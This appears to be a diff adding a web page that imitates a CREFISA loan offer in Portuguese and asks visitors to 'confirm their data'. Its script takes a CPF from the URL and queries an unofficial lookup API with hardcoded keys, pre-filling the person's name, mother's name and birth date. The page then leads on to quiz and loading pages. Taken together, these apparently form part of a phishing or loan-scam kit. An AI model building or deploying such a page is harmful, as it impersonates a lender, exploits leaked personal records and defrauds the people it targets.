@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="css/AvfG3JP5NHz4.css" />
+    <link rel="stylesheet" href="css/TVwRKqcDl6JP.css" />
+    <link rel="stylesheet" href="css/ZWcPFmL2CcoG.css" />
+    <link rel="stylesheet" href="css/RrW5toxfw6fZ.css" />
+    <link rel="stylesheet" href="css/nEnBSReujNZD.css" />
+    <link rel="shortcut icon" href="images/icon.png" />
+    <title>:: CREFISA - EMPRESTIMO ::</title>
+        <link rel="shortcut icon" href="images/icon.png" />
+  </head>
+  <body style="background-color: #38c0e5">
+    <audio id="meuAudio">
+      <source src="media/e0tiS2xgUCAS.mp3" type="audio/mp3" />
+    </audio>
+
+    <div
+      id="p1"
+      style="
+        background-color: #ffffff;
+        padding: 40px 0 20px 0;
+        position: relative;
+      "
+    >
+      <img
+        style="
+          width: 140px;
+          padding-bottom: 45px;
+          margin: 0 auto;
+          display: flex;
+        "
+        src="images/Nd09E2tPjqqk.png"
+      />        <h1
+          style="
+            font-family: 'RecoletaBold';
+            font-size: 30px;
+            text-align: center;
+            margin: 25px 0 20px 0;
+            color: #000000;
+          "
+        >
+          Confirme Seus Dados!
+        </h1>
+      
+    </div>
+
+    <div style="background-color: transparent; width: 100%; margin-top: 125px">
+      <div class="coolinput" style="margin-top: -10px">
+        <div style="position: relative">
+          <label
+            style="z-index: 1; background-color: #38c0e5; color: #ffffff"
+            for="cpfUsuario"
+            id="textoEmail"
+            class="text"
+            >Nome Completo:</label
+          >
+          <input
+            style="
+              text-transform: uppercase;
+              background-color: transparent;
+              border: 2px solid;
+              color: #ffffff;
+              ::placeholder {
+                color: #000000;
+              }
+            "
+            type="text"
+            disabled
+            name="nomeCompleto"
+            id="nomeCompleto"
+            class="input"
+            autocomplete="off"
+            required=""
+          />
+        </div>
+
+        <br />
+
+        <label
+          style="z-index: 1; background-color: #38c0e5; color: #ffffff"
+          for="cpfUsuario"
+          id="textoEmail"
+          class="text"
+          >CPF</label
+        >
+        <input
+          style="
+            text-transform: uppercase;
+            background-color: transparent;
+            border: 2px solid;
+            color: #ffffff;
+            ::placeholder {
+              color: #000000;
+            }
+          "
+          type="text"
+          disabled
+          name="cpfUsuario"
+          id="cpfUsuario"
+          class="input cpfUsuario"
+          autocomplete="off"
+          required=""
+          maxlength="14"
+          oninput="formatCPF(this)"
+          onblur="validarCPFOnBlur(this)"
+        />
+
+        <br />
+
+        <label
+          style="z-index: 1; background-color: #38c0e5; color: #ffffff"
+          for="cpfUsuario"
+          id="textoEmail"
+          class="text"
+          >Nome da Mãe:</label
+        >
+        <input
+          style="
+            text-transform: uppercase;
+            background-color: transparent;
+            border: 2px solid;
+            color: #ffffff;
+            ::placeholder {
+              color: #ffffff;
+            }
+          "
+          disabled
+          type="text"
+          name="nomeMae"
+          id="nomeMae"
+          class="input"
+          autocomplete="off"
+          required=""
+        />
+
+        <br />
+
+        <label
+          style="z-index: 1; background-color: #38c0e5; color: #ffffff"
+          for="cpfUsuario"
+          id="textoEmail"
+          class="text"
+          >Data de Nascimento:</label
+        >
+        <input
+          style="
+            text-transform: uppercase;
+            background-color: transparent;
+            border: 2px solid;
+            color: #ffffff;
+            ::placeholder {
+              color: #ffffff;
+            }
+          "
+          type="text"
+          name="dataNascimento"
+          id="dataNascimento"
+          disabled
+          class="input"
+          autocomplete="off"
+          required=""
+          maxlength="8"
+          oninput="formatDataNascimento(this)"
+        />
+
+        <a
+          href="../quiz/index.html"
+          style="
+            display: block;
+            background-color: #FDB913;
+            color: #ffffff;
+            text-align: center;
+            padding: 15px;
+            border-radius: 23px;
+            position: unset;
+            margin-top: 30px;
+            width: 100%;
+          "
+          class="continuarAtivo"
+          >Dados Corretos!</a
+        >
+
+        <h1
+          style="
+            font-family: 'RecoletaBold';
+            font-size: 15px;
+            text-align: center;
+            margin: 25px 0 10px 0;
+            color: #ffffff;
+          "
+        ></h1>
+
+        <a
+          href="../loading/index.html"
+          style="
+            display: block;
+            background-color: #FDB913;
+            color: #ffffff;
+            text-align: center;
+            padding: 15px;
+            border-radius: 23px;
+            position: unset;
+            margin-top: 30px;
+            width: 100%;
+          "
+          class="continuarAtivo"
+          >Não sou Eu!</a
+        >
+      </div>
+    </div>
+
+    <script>
+      function formatCPF(cpfInput) {
+        // Remove caracteres não numéricos
+        let cpf = cpfInput.value.replace(/\D/g, "");
+        // Formatação do CPF (000.000.000-00)
+        cpf = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+        cpfInput.value = cpf;
+      }
+
+      function formatDataNascimento(dataInput) {
+        // Remove caracteres não numéricos
+        let data = dataInput.value.replace(/\D/g, "");
+        // Limita a data a 8 caracteres (DDMMAAAA)
+        data = data.substring(0, 8);
+        // Formatação da data (DD/MM/AAAA)
+        data = data.replace(/(\d{2})(\d{2})(\d{4})/, "$1/$2/$3");
+        dataInput.value = data;
+      }
+
+      document
+        .getElementById("cpfUsuario")
+        .addEventListener("input", function () {
+          formatCPF(this);
+        });
+
+      document
+        .getElementById("dataNascimento")
+        .addEventListener("input", function () {
+          formatDataNascimento(this);
+        });
+
+      //consulta o cpf na api https://apiconsultas.store/api/?usuario=f29c46e3d9519389261254ab4188131b&api=cpf&cpf={{cpf}}
+      function consultarCPF(cpf) {
+        const headers = {
+          "Origin-Sec":
+            "c72a9a5ff481a585407473b9b4440325fd4657707562e6769335502ed922437b",
+        };
+        fetch(`https://api.whatsfy.shop/api/v1/cpf/${cpf}`, { headers })
+          .then((response) => response.json())
+          .then((data) => {
+            document.getElementById("nomeCompleto").value = data.nome;
+            document.getElementById("nomeMae").value = data.mae;
+            document.getElementById("dataNascimento").value = data.nascimento;
+            document.getElementById("cpfUsuario").value = cpf;
+          })
+          .catch((error) => console.error("Erro ao consultar CPF:", error));
+      }
+
+      window.onload = function () {
+        let cpf = window.location.search.split("=")[1];
+        consultarCPF(cpf);
+      };
+    </script>
+  </body>
+</html>
